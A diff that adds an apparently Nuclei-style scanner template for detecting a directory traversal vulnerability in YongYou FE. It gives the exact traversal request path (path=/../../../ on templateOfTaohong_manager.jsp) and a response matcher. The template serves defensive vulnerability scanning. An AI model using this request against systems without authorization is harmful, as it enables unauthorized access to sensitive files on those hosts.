@@ -1,0 +1,18 @@
+id: yongyou-fe-directory-traversal
+info:
+  name: YongYou FE Directory Traversal Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+  description: |
+    This template detects a directory traversal vulnerability in YongYou FE allowing unauthorized access to sensitive files.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "function deletefile(name,path)"
